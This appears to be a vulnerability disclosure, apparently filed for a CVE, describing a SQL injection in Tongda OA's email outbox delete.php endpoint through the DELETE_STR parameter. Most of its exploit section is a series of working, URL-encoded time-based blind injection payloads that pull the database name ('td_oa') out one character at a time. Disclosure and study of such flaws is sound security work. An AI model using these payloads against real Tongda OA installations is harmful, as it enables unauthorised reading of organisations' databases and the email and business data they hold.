SQL injection vulnerability exists in Tongda OA v2017 and versions below 11.10

official website:https://www.tongda2000.com/

version:Less than v11.10, v2017

route：/general/email/outbox/delete.php

injection parameter:$DELETE_STR



#### 	1.Vulnerability analysis

The parameter $DELETE_STR here is directly spliced into the sql statement after removing the null value. There is a sql injection point.

![.\TongDa Sql inject.assets\t1.png](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/t1.png?token=GHSAT0AAAAAACNLZOLMSWI63E34LCCSGHGQZNTDONQ)

At the same time, global parameter filtering is shown in the figure below, and only conventional injection filtering detection is performed.

![[image-20240126094241423](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126094241423.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126094241423.png?token=GHSAT0AAAAAACNLZOLMRBD2RD2Y7S3XAX2CZNTDPEQ)

#### 	2.Vulnerability verification

We can use Cartesian product blind injection for injection. The following payload can determine that the first character of the database name is t, because it was successfully delayed at 116. The ASCII code 116 also corresponds to the lowercase letter t. By analogy, the database name and any information about the database can be obtained through blind injection.

```
1)%20and%20(substr(DATABASE(),1,1))=char(116)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![[image-20240126094806730](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126094806730.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126094806730.png?token=GHSAT0AAAAAACNLZOLM7QTEEQQ5Z6IJUFRKZNTDPGQ)

If we replace 116 with another value such as 115, then there will be no time delay, thus proving that our injection is successful. There is a sql injection vulnerability here.

```
1)%20and%20(substr(DATABASE(),1,1))=char(115)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![[image-20240126095114500](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126095114500.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126095114500.png?token=GHSAT0AAAAAACNLZOLM7JYOCBZA227JNCQSZNTDPIA)

#### 	3.Exploit

Based on the above verification analysis, the SQL injection vulnerability exists. We can continue to obtain the complete name of the entire database through blind injection.

The second digit of the database is intercepted through blind injection, and the second digit is judged to be the letter d through the delay time, and the ASCII code is 100.

```
1)%20and%20(substr(DATABASE(),2,1))=char(100)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![[image-20240126095822818](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126095822818.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126095822818.png?token=GHSAT0AAAAAACNLZOLMUQBW3GOCONLUXVEMZNTDPKA)

The third digit of the database is intercepted through blind injection, and the second digit is judged to be '_' through the delay time, and the ASCII code is 95.

```
1)%20and%20(substr(DATABASE(),3,1))=char(95)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![[image-20240126095911470](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126095911470.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126095911470.png?token=GHSAT0AAAAAACNLZOLNNVSMUA42M2W6UASGZNTDQKQ)

The fourth digit of the database is intercepted through blind injection, and the second digit is judged to be the letter o through the delay time, and the ASCII code is 111.

```
1)%20and%20(substr(DATABASE(),4,1))=char(111)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![image-20240126100122531](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126100122531.png)

The fifth digit of the database is intercepted through blind injection, and the second digit is judged to be the letter a through the delay time, and the ASCII code is 97.

```
1)%20and%20(substr(DATABASE(),5,1))=char(97)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1
```

![[image-20240126100029696](G:\北理工\研一\灵通测\二期\漏洞挖掘\cve2\CVE\TongDa Sql inject.assets\image-20240126100029696.png)](https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126100029696.png?token=GHSAT0AAAAAACNLZOLNVN6ENR5FH6DJEYYQZNTDQMQ)https://raw.githubusercontent.com/rockersiyuan/CVE/main/TongDa%20Sql%20inject.assets/image-20240126100029696.png?token=GHSAT0AAAAAACNLZOLNVN6ENR5FH6DJEYYQZNTDQMQ

In summary, the complete database name can be obtained based on this sql injection vulnerability: td_oa
